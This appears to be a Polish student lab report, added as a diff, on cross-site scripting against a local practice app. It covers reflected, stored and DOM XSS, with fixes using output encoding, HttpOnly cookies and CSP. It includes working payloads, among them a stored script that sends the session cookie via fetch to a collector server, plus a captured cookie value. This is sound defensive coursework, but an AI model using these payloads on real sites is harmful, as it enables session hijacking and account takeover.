@@ -1,0 +1,155 @@
+--- ZADANIE 1 - XSS ODBITY ---
+
+
+
+Adres z ładunkiem: 
+
+http://127.0.0.1:8080/szukaj?q=<script>document.body.style.backgroundColor='red';document.title='XSS-odbity';</script>
+
+
+
+Numer wiersza z bledem: 
+
+Błąd znajdował sie w pliku app.py w wierszu 28 (html += "<h1>Wyniki wyszukiwania dla: " + fraza + "</h1><ul>").
+
+
+
+Fragment HTML przed poprawka: 
+
+Wyniki wyszukiwania dla: <script>document.body.style.backgroundColor='red';document.title='XSS-odbity';</script>
+
+
+
+Fragment HTML po poprawce: 
+
+Wyniki wyszukiwania dla: &lt;script&gt;document.body.style.backgroundColor=&apos;red&apos;;document.title=&apos;XSS-odbity&apos;;&lt;/script&gt;
+
+
+
+Dlaczego kodowanie wyjścia jest lepsze od usuwania słowa script: 
+
+Kodowanie wyjscia unieszkodliwia wszystkie znaki specjalne bez wyjatku (traktujac je jako tekst), natomiast usuwanie konkretnego slowa (np. script) można łatwo obejść używając innych wektorow ataku (jak tag img z onerror) lub zmieniając wielkość liter.
+
+
+
+Wnioski: 
+
+W pierwszym zadaniu wykorzystano podatność, wprowadzając złośliwy kod JavaScript bezpośrednio do parametru w adresie URL wyszukiwarki. Przed poprawka aplikacja osadzala ten kod prosto w strukturze strony, co powodowało jego natychmiastowe wykonanie przez przeglądarke i zmiane koloru tła na czerwony. Zastosowanie funkcji escape() zakodowało dane wejściowe przekazywane przez użytkownika, zmieniajc znaki specjalne na bezpieczny tekst i wyświetlając ładunek dosłownie na ekranie, całkowicie blokując złośliwy skrypt.
+
+
+
+
+
+--- ZADANIE 2 - XSS ZAPISANY I PRZEJECIE SESJI ---
+
+
+
+Treść ładunku: 
+
+<script>fetch('http://localhost:8081/?c=' + document.cookie);</script>
+
+
+
+Wpis zbieracza przed zmiana: 
+
+ZEBRANO: /?c=session=eyJ1enl0a293bmlrIjoiYW5uYSJ9.avb6Ew...
+
+
+
+Wpis zbieracza po zmianie: 
+
+GET /?c= HTTP/1.1 (brak ciasteczka w logach ze wzgledu na blokade)
+
+
+
+Wynik kroku 3: 
+
+Zwrócona została prywatna notatka należąca do ofiary (użytkownika anna).
+
+
+
+Nagłówki Set-Cookie przed zmiana: 
+
+Set-Cookie: session=eyJ1enl0a293bmlrIjoiYW5uYSJ9.avb7Cg...; Path=/
+
+
+
+Nagłówki Set-Cookie po zmianie: 
+
+Set-Cookie: session=eyJ1enl0a293bmlrIjoiYW5uYSJ9.avb7SQ...; HttpOnly; Path=/
+
+
+
+Dlaczego HttpOnly nie usuwa podatności XSS: 
+
+Flaga HttpOnly blokuje skryptom dostęp do ciasteczka sesyjnego, ale złośliwy kod (XSS) nadal uruchamia się w przeglądarce i może wykonywać szkodliwe akcje bezpośrednio na stronie w imieniu zalogowanego użytkownika.
+
+
+
+Wnioski: 
+
+W tym zadaniu udowodniono możliwość kradzieży sesji (Hijacking) za pomocą ataku XSS zapisany. Atakujący osadził na tablicy złośliwy skrypt, który potajemnie odczytał ciasteczko ofiary i wysłał je do zewnętrznego serwera, co pozwoliło atakującemu wejść na jej konto bez znajomości hasła. Trzeba było włączyć flagę HttpOnly dla ciasteczek sesyjnych. Wniosek: flaga HttpOnly jest kluczowa, bo skutecznie blokuje skryptom JavaScript (np. poprzez document.cookie) dostęp do ciasteczka, chroniąc przed jego kradzieżą.
+
+
+
+
+
+--- ZADANIE 3 - NAPRAWA I CONTENT SECURITY POLICY ---
+
+
+
+Tabela ładunków (Typ / Ładunek / Wynik przed / Wynik po):
+
+
+
+1. Odbity:
+
+- Ładunek: ?q=<script>document.body.style.backgroundColor='red'</script>
+
+- Przed: Wykonanie skryptu (zmiana tła na czerwone).
+
+- Po: Ładunek wyświetlony bezpiecznie jako tekst.
+
+
+
+2. Zapisany:
+
+- Ładunek: <script>fetch('http://localhost:8081/?c=' + document.cookie);</script>
+
+- Przed: Skrypt wykradł sesje (request u zbieracza).
+
+- Po: Ładunek wyświetlony bezpiecznie jako tekst.
+
+
+
+3. DOM:
+
+- Ładunek: #<img src=x onerror="document.title='XSS-DOM'">
+
+- Przed: Zmiana nazwy (tytułu) zakładki na "XSS-DOM".
+
+- Po: Bezpieczne renderowanie tekstu (textContent).
+
+
+
+Nagłówek CSP z odpowiedzi: 
+
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
+
+
+
+Wynik testu tekstu "Zażółć gęślą jaźń": 
+
+Znaczniki pogrubienia <b> oraz cudzysłowy wyświetliły się dosłownie jako zwykły tekst.
+
+
+
+Dlaczego CSP jest dodatkowa warstwa, a nie zamiennikiem kodowania wyjścia: 
+
+CSP redukuje zasięg ataku blokując wywołania do zewnętrznych domen i skrypty inline, jednak poprawne kodowanie wyjścia rozwiązuje problem u jego źródła, gwarantując, ze wejściowe dane będą zawsze bezpiecznie renderowane jako tekst.
+
+
+
+Wnioski: 
+
+W tym zadaniu naprawiono podatność na XSS zapisany poprzez usuniecie filtru wyłączającego automatyczne kodowanie oraz wyeliminowano DOM XSS, przenosząc obsługę skryptu do zewnętrznego pliku statycznego i zastępując niebezpieczna funkcje innerHTML bezpieczna właściwością textContent. Dodatkowo, globalnie wdrożono nagłówek Content-Security-Policy (CSP). Wynik pokazal, ze uzycie odpowiednich metod osadzania danych (textContent, auto-kodowanie) w pelni neutralizuje zlosliwy kod, zamieniajac go w bezpieczny ciag znakow. Wdrozenie CSP stanowi cenna, dodatkowa warstwe ochrony obnizajaca potencjalne straty, jesli programista zapomni zakodowac dane, ale nie zastepuje ono samego kodowania wejscia/wyjscia jako glownej linii obrony przed XSS.
